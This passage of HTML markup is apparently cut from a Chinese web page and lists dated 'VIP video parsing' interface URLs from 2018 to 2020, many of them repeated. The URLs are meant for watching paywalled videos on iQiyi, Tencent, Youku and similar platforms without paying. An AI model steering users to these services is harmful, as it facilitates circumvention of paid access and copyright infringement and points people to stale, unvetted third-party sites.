class="line"></span><br><span class="line">http:&#x2F;&#x2F;jx.09877as.cn&#x2F;jx.php&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;jx.yipolo111.cn&#x2F;jx.php&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;jx.908astbb.cn&#x2F;jx.php&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;jx.dlzyrk001.cn&#x2F;jx.php&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;jx.dccmy.org.cn&#x2F;jx.php&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;jx.boctx.cn&#x2F;jx.php&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;jx.hxbte.cn&#x2F;jx.php&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;api.visaok.net&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;jx.618g.com&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;yun.baiyug.cn&#x2F;vip&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;api.baiyug.cn&#x2F;vip&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;api.flvsp.com&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;api.xfsub.com&#x2F;index.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;api.xfsub.com&#x2F;index.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;jiexi.071811.cc&#x2F;jx2.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;player.jidiaose.com&#x2F;supapi&#x2F;iframe.php?v&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;www.82190555.com&#x2F;index&#x2F;qqvod.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;api.pucms.com&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;api.baiyug.cn&#x2F;vip&#x2F;index.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;api.flvsp.com&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;www.82190555.com&#x2F;index&#x2F;qqvod.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;2gty.com&#x2F;apiurl&#x2F;yun.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;v.2gty.com&#x2F;apiurl&#x2F;yun.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">直接观看：http:&#x2F;&#x2F;tv.inkb.ink&#x2F;index.html</span><br><span class="line"></span><br><span class="line">扫码：http:&#x2F;&#x2F;www.guandianzhiku.com&#x2F;v&#x2F;s&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">扫码：https:&#x2F;&#x2F;v.7cyd.com&#x2F;vip&#x2F;?url&#x3D;腾讯视频 慢</span><br><span class="line"></span><br><span class="line">扫码：http:&#x2F;&#x2F;zxjx.00vb.com&#x2F;zdhx&#x2F;index.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">扫码：https:&#x2F;&#x2F;www.jqaaa.com&#x2F;jx.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">无广告超清解析：http:&#x2F;&#x2F;jx.awx88.cn&#x2F;jiexi&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">弹幕解析：http:&#x2F;&#x2F;gongxiangtv.cn&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">VIP视频解析北极XS视频解析：http:&#x2F;&#x2F;beijixs.cn&#x2F; 视频高清</span><br><span class="line"></span><br><span class="line">VIP视频解析116kan智能解析：https:&#x2F;&#x2F;vip.116kan.com&#x2F; 高清视频</span><br><span class="line"></span><br><span class="line">365t在線免費解析觀看系統：http:&#x2F;&#x2F;vip.365tol.top&#x2F;</span><br><span class="line"></span><br><span class="line">BL智能解析：https:&#x2F;&#x2F;vip.bljiex.com&#x2F;</span><br><span class="line"></span><br><span class="line">kingtail智能解析：https:&#x2F;&#x2F;jx.kingtail.xyz&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;jsap.attakids.com&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;api.lnwu.net&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">91视频解析：https:&#x2F;&#x2F;www.91jxs.com&#x2F;jiexi&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;api.jhys.top&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">思古视频服务：https:&#x2F;&#x2F;api.sigujx.com&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">小野马解析：https:&#x2F;&#x2F;www.xymav.com&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">诺讯智能解析：https:&#x2F;&#x2F;www.nxflv.com&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">热搜视频：https:&#x2F;&#x2F;v.resoumen.com&#x2F;</span><br><span class="line"></span><br><span class="line">全民解析：http:&#x2F;&#x2F;qmaile.com&#x2F; 解析聚合，多线路解析</span><br><span class="line"></span><br><span class="line">聚神铺vip解析：http:&#x2F;&#x2F;www.jspoo.com&#x2F;vip.html 解析聚合，多线路选择</span><br><span class="line"></span><br><span class="line">Yun Parse视频云解析：http:&#x2F;&#x2F;120.27.155.106&#x2F; 填视频ID而不是视频网页地址，另支持解析QQ相册等地址</span><br><span class="line"></span><br><span class="line">爱看解析：http:&#x2F;&#x2F;tv.vipsli.com&#x2F;</span><br><span class="line"></span><br><span class="line">TVB云播全网VIP视频解析：http:&#x2F;&#x2F;vip.hktvyb.com&#x2F; 聚合解析，多线路</span><br><span class="line"></span><br><span class="line">Playm3u8解析：https:&#x2F;&#x2F;www.playm3u8.cn&#x2F;jiexi.php?url&#x3D; 除了常见VIP视频地址外，还支持解析QQ相册等地址</span><br><span class="line"></span><br><span class="line">千亿解析：https:&#x2F;&#x2F;www.qianyicp.com&#x2F;jiexi&#x2F;index.php?url&#x3D; 蓝光超清解析接口</span><br><span class="line"></span><br><span class="line">OK解析：http:&#x2F;&#x2F;www.okjx.cc&#x2F;ceshi&#x2F; 测试后不太清晰</span><br><span class="line"></span><br><span class="line">618G免费解析：https:&#x2F;&#x2F;jx.618g.com&#x2F; 测试后不是很清晰</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;avip.fun&#x2F;tv?utm_source&#x3D; 测试后直接不清晰</span><br><span class="line"></span><br><span class="line">VIP视频网站在线视频解析接口（2020.12.23更新）</span><br><span class="line">万能接口： https:&#x2F;&#x2F;aikan-tv.com&#x2F;tong.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">万能接口2：http:&#x2F;&#x2F;www.sfsft.com&#x2F;admin.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">爱奇艺vip接口： https:&#x2F;&#x2F;aikan-tv.com&#x2F;qy.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">腾讯VIP解析接口： https:&#x2F;&#x2F;aikan-tv.com&#x2F;tong.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">优酷VIP解析接口： https:&#x2F;&#x2F;aikan-tv.com&#x2F;tong.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">乐视VIP解析接口： https:&#x2F;&#x2F;aikan-tv.com&#x2F;tong.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">芒果VIP解析接口： https:&#x2F;&#x2F;aikan-tv.com&#x2F;tong.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">搜狐VIP解析接口： https:&#x2F;&#x2F;aikan-tv.com&#x2F;tong.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">A站解析接口： https:&#x2F;&#x2F;aikan-tv.com&#x2F;tong.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">B站解析接口： https:&#x2F;&#x2F;aikan-tv.com&#x2F;tong.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">万能接口：http:&#x2F;&#x2F;aikan-tv.com&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">万能解析接口：http:&#x2F;&#x2F;www.vipjiexi.com&#x2F;tong.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">通用解析 http:&#x2F;&#x2F;api.ccoyo.cc&#x2F;jiexi.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">通用解析 https:&#x2F;&#x2F;api.47ks.com&#x2F;webcloud&#x2F;?v&#x3D;</span><br><span class="line"></span><br><span class="line">通用解析 http:&#x2F;&#x2F;api.mp4la.net&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">通用解析 http:&#x2F;&#x2F;v.72du.com&#x2F;api&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">通用解析 http:&#x2F;&#x2F;api.47ks.com&#x2F;webcloud&#x2F;?v&#x3D;</span><br><span class="line"></span><br><span class="line">通用解析 http:&#x2F;&#x2F;jx.71ki.com&#x2F;index.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">通用解析 http:&#x2F;&#x2F;000o.cc&#x2F;jx&#x2F;ty.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">通用解析 http:&#x2F;&#x2F;www.yydy8.com&#x2F;Common&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">通用解析 http:&#x2F;&#x2F;yun.mt2t.com&#x2F;yun?url&#x3D;</span><br><span class="line"></span><br><span class="line">通用解析 http:&#x2F;&#x2F;api.mp4la.net&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">通用解析 http:&#x2F;&#x2F;yyygwz.com&#x2F;index.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">通用解析 http:&#x2F;&#x2F;v.72du.com&#x2F;api&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">通用解析 http:&#x2F;&#x2F;api.47ks.com&#x2F;webcloud&#x2F;?v&#x3D;</span><br><span class="line"></span><br><span class="line">通用解析 http:&#x2F;&#x2F;jx.71ki.com&#x2F;index.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">通用解析 http:&#x2F;&#x2F;www.97zxkan.com&#x2F;jiexi&#x2F;97zxkanapi.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">通用解析 http:&#x2F;&#x2F;www.wmxz.wang&#x2F;video.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">通用解析 http:&#x2F;&#x2F;www.bbshanxiucao.top&#x2F;video.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">通用解析 http:&#x2F;&#x2F;www.xiguaso.com&#x2F;api&#x2F;index.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">通用解析 http:&#x2F;&#x2F;www.kppev.cn&#x2F;jiexi&#x2F;5&#x2F;1&#x2F;1.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">通用解析 http:&#x2F;&#x2F;api.mp4la.net&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">通用解析 http:&#x2F;&#x2F;v.72du.com&#x2F;api&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">通用解析 http:&#x2F;&#x2F;api.47ks.com&#x2F;webcloud&#x2F;?v&#x3D;</span><br><span class="line"></span><br><span class="line">通用解析 http:&#x2F;&#x2F;jx.71ki.com&#x2F;index.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">通用解析 http:&#x2F;&#x2F;000o.cc&#x2F;jx&#x2F;ty.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">通用解析 http:&#x2F;&#x2F;5qiyi.sdyhy.cn&#x2F;5qiyi&#x2F;5qiyi2.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">通用解析 http:&#x2F;&#x2F;vip.sdyhy.cn&#x2F;ckflv&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">通用解析 http:&#x2F;&#x2F;player.gakui.top&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">通用解析 http:&#x2F;&#x2F;qtzr.net&#x2F;s&#x2F;?qt&#x3D;</span><br><span class="line"></span><br><span class="line">通用解析 http:&#x2F;&#x2F;www.vipjiexi.com&#x2F;yun.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">VIP视频网站在线视频解析接口（2020.08.11更新）</span><br><span class="line">通用解析1：https:&#x2F;&#x2F;api.47ks.com&#x2F;webcloud&#x2F;?v&#x3D;</span><br><span class="line"></span><br><span class="line">优酷云解析：http:&#x2F;&#x2F;api.baiyug.cn&#x2F;vip&#x2F;index.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">优酷云解析：http:&#x2F;&#x2F;977345961.kezi.wang&#x2F;ykyun&#x2F;c.php?vid&#x3D;</span><br><span class="line"></span><br><span class="line">通用解析2：http:&#x2F;&#x2F;api.mp4la.net&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">通用解析3：http:&#x2F;&#x2F;v.72du.com&#x2F;api&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">通用解析4：http:&#x2F;&#x2F;api.47ks.com&#x2F;webcloud&#x2F;?v&#x3D;</span><br><span class="line"></span><br><span class="line">通用解析5：http:&#x2F;&#x2F;jx.71ki.com&#x2F;index.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">通用解析6：http:&#x2F;&#x2F;000o.cc&#x2F;jx&#x2F;ty.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">通用解析7：http:&#x2F;&#x2F;www.yydy8.com&#x2F;Common&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">通用解析8：http:&#x2F;&#x2F;yun.mt2t.com&#x2F;yun?url&#x3D;</span><br><span class="line"></span><br><span class="line">通用解析9：http:&#x2F;&#x2F;api.mp4la.net&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">通用解析10：http:&#x2F;&#x2F;yyygwz.com&#x2F;index.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">通用解析11：http:&#x2F;&#x2F;v.72du.com&#x2F;api&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">通用解析12：http:&#x2F;&#x2F;api.47ks.com&#x2F;webcloud&#x2F;?v&#x3D;</span><br><span class="line"></span><br><span class="line">通用解析13：http:&#x2F;&#x2F;jx.71ki.com&#x2F;index.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">通用解析14：http:&#x2F;&#x2F;www.yydy8.com&#x2F;Common&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">通用解析15：http:&#x2F;&#x2F;www.97zxkan.com&#x2F;jiexi&#x2F;97zxkanapi.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">通用解析16：http:&#x2F;&#x2F;www.wmxz.wang&#x2F;video.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">通用解析17：http:&#x2F;&#x2F;www.bbshanxiucao.top&#x2F;video.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">通用解析18：http:&#x2F;&#x2F;www.xiguaso.com&#x2F;api&#x2F;index.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">通用解析19：http:&#x2F;&#x2F;www.kppev.cn&#x2F;jiexi&#x2F;5&#x2F;1&#x2F;1.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">迅雷磁力链：http:&#x2F;&#x2F;apiv.ga&#x2F;magnet&#x2F;</span><br><span class="line"></span><br><span class="line">通用解析20：http:&#x2F;&#x2F;api.mp4la.net&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">通用解析21：http:&#x2F;&#x2F;v.72du.com&#x2F;api&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">通用解析22：http:&#x2F;&#x2F;api.47ks.com&#x2F;webcloud&#x2F;?v&#x3D;</span><br><span class="line"></span><br><span class="line">通用解析23：http:&#x2F;&#x2F;jx.71ki.com&#x2F;index.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">通用解析24：http:&#x2F;&#x2F;000o.cc&#x2F;jx&#x2F;ty.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">通用解析25：http:&#x2F;&#x2F;www.yydy8.com&#x2F;Common&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">通用解析26：http:&#x2F;&#x2F;yun.mt2t.com&#x2F;yun?url&#x3D;</span><br><span class="line"></span><br><span class="line">通用解析27：http:&#x2F;&#x2F;api.mp4la.net&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">通用解析28：http:&#x2F;&#x2F;yyygwz.com&#x2F;index.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">VIP视频网站在线视频解析接口（2019.12.01更新）</span><br><span class="line">VIP视频解析接口1：http:&#x2F;&#x2F;jiexi.chenfuwl.com&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">VIP视频解析接口2：http:&#x2F;&#x2F;www.guandianzhiku.com&#x2F;v&#x2F;s&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">VIP视频解析接口3：https:&#x2F;&#x2F;api.hdworking.top&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">VIP视频解析接口4：http:&#x2F;&#x2F;tew666.cn&#x2F;?v&#x3D;</span><br><span class="line"></span><br><span class="line">VIP视频解析接口5：https:&#x2F;&#x2F;vip.1988ds.cn&#x2F;?v&#x3D;</span><br><span class="line"></span><br><span class="line">VIP视频解析接口6：http:&#x2F;&#x2F;www.10yy.com.cn&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">VIP视频解析接口7：http:&#x2F;&#x2F;jx.ixiaoyao.top&#x2F;?v&#x3D;</span><br><span class="line"></span><br><span class="line">VIP视频解析接口8：https:&#x2F;&#x2F;cdn.yangju.vip&#x2F;k&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">VIP视频解析接口9：https:&#x2F;&#x2F;jx.lache.me&#x2F;cc&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">VIP视频解析接口10：https:&#x2F;&#x2F;api.653520.top&#x2F;vip&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">VIP视频解析接口11：https:&#x2F;&#x2F;jx.ab33.top&#x2F;vip&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">VIP视频解析接口12：https:&#x2F;&#x2F;vip.mpos.ren&#x2F;v&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">VIP视频解析接口13：https:&#x2F;&#x2F;jx.000180.top&#x2F;jx&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">VIP视频解析接口14：https:&#x2F;&#x2F;jx.km58.top&#x2F;jx&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">VIP视频解析接口15：https:&#x2F;&#x2F;api.v6.chat&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">VIP视频网站在线视频解析接口（2019.5.29更新）</span><br><span class="line">VIP视频解析接口1：https:&#x2F;&#x2F;api.smq1.com&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">VIP视频解析接口2：http:&#x2F;&#x2F;api.69ne.com&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">VIP视频解析接口3：http:&#x2F;&#x2F;vipjx.pyhj.net&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">VIP视频解析接口4：http:&#x2F;&#x2F;jx.duzhiqiang.com</span><br><span class="line"></span><br><span class="line">VIP视频解析接口5：https:&#x2F;&#x2F;jx.yg5.net&#x2F;Svip&#x2F;?v&#x3D;</span><br><span class="line"></span><br><span class="line">VIP视频解析接口6：https:&#x2F;&#x2F;jx.vipdyqxk.com&#x2F;m3u8.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">VIP视频解析接口7：https:&#x2F;&#x2F;jx.vipdyqxk.com&#x2F;m3u8.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">VIP视频解析接口8：http:&#x2F;&#x2F;jx.netchess.cn&#x2F;?v&#x3D;</span><br><span class="line"></span><br><span class="line">VIP视频解析接口9：http:&#x2F;&#x2F;jx.wslmf.com&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">VIP视频解析接口10：https:&#x2F;&#x2F;www.myxin.top&#x2F;jx&#x2F;api&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">无广告通用HTTP接口 ：http:&#x2F;&#x2F;jx.9ku.wang&#x2F;9ku&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">无广告通用HTTPS接口：hhttps:&#x2F;&#x2F;jx.9ku.wang&#x2F;9ku&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">其他接口地址：</span><br><span class="line"></span><br><span class="line">最惠买：http:&#x2F;&#x2F;www.zhmdy.top&#x2F;index.php?zhm_jx&#x3D;</span><br><span class="line"></span><br><span class="line">噗噗电影：http:&#x2F;&#x2F;www.pupudy.com&#x2F;splay.php?play&#x3D;</span><br><span class="line"></span><br><span class="line">百域阁：http:&#x2F;&#x2F;api.baiyug.cn&#x2F;vip&#x2F;index.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">搜你妹：http:&#x2F;&#x2F;www.sonimei.cn&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">玩的嗨：http:&#x2F;&#x2F;tv.wandhi.com&#x2F;go.html?url&#x3D;</span><br><span class="line"></span><br><span class="line">ODFLV：http:&#x2F;&#x2F;aikan-tv.com&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">人人发布：http:&#x2F;&#x2F;v.renrenfabu.com&#x2F;jiexi.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">9ku：https:&#x2F;&#x2F;jx.9ku.wang&#x2F;9ku&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">蛋壳解析：http:&#x2F;&#x2F;www.58danke.top&#x2F;jx&#x2F;xin?url&#x3D;</span><br><span class="line"></span><br><span class="line">海屿城解析：http:&#x2F;&#x2F;www.sostv.club&#x2F;jiexi&#x2F;index.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">VIP视频解析接口，电影解析高清接口（2019.3.15日整理更新）</span><br><span class="line">接口1：http:&#x2F;&#x2F;jx.52a.ink&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">接口2：http:&#x2F;&#x2F;jx.ledboke.com&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">接口3：http:&#x2F;&#x2F;jx.98a.ink&#x2F;vip&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">接口4：http:&#x2F;&#x2F;api.ledboke.com&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">说明：url&#x3D;后面为视频站原地址</span><br><span class="line"></span><br><span class="line">VIP视频频解析接口地址（2019年02月）</span><br><span class="line">2019年2月28日09:18:20 新增一波~</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;v.d9y.net&#x2F;vip&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;jx.du2.cc&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;api.bbbbbb.me&#x2F;jx&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;api.bbbbbb.me&#x2F;yun&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;api.bbbbbb.me&#x2F;vip&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;api.bbbbbb.me&#x2F;yunjx&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;api.bbbbbb.me&#x2F;sg&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;api.51ckm.com&#x2F;jx.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;api.hlglwl.com&#x2F;jx.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;www.82190555.com&#x2F;index.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;app.baiyug.cn:2019&#x2F;vip&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;api2.club&#x2F;index.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;all.baiyug.cn:2021&#x2F;QQB_kandianm&#x2F;kandians_api.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;app.baiyug.cn:2019&#x2F;vip&#x2F;player.php?vid&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;69p.top&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;74t.top&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;mimijiexi.top&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;55jx.top&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;playx.top&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;nitian9.com&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;19g.top&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;607p.com&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;52088.online&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;bofang.online&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;play1.online&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;ckplay.online&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;api.baiyug.vip&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;880kan.com&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;59uv.com&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">VIP视频频解析接口地址（2019年01月）</span><br><span class="line">http:&#x2F;&#x2F;api.smq1.com&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;api.smq1.com&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;jx.hezeshi.net&#x2F;ce&#x2F;jlexi.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;api.hellosex.cc&#x2F;jlexi.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;api.pangujiexi.com&#x2F;player.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;at520.cn&#x2F;jx&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;www.cmys.tv&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;jx.km58.top&#x2F;jx&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;www.fantee.net&#x2F;fantee&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;api.51ckm.com&#x2F;Box.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;www.3aym.cn&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;beaacc.com&#x2F;api.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;api.zuilingxian.com&#x2F;jiexi.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;jx.2tv.org&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;api.bbbbbb.me&#x2F;ipsign&#x2F;player.php?v&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;17kyun.com&#x2F;api.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">VIP视频频解析接口地址（2018年12月）</span><br><span class="line">https:&#x2F;&#x2F;jx.hezeshi.net&#x2F;ce&#x2F;jlexi.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;api.hellosex.cc&#x2F;jlexi.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;api.pangujiexi.com&#x2F;player.php?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;at520.cn&#x2F;jx&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;player.jidiaose.com&#x2F;supapi&#x2F;iframe.php?v&#x3D;</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;jx.okokjx.com&#x2F;okok&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;api.jykkk.com&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;jx.km58.top&#x2F;jx&#x2F;?url&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;jx.fantee.net&#x2F;fantee&#x2F;?url&#x3D;</span><br><span 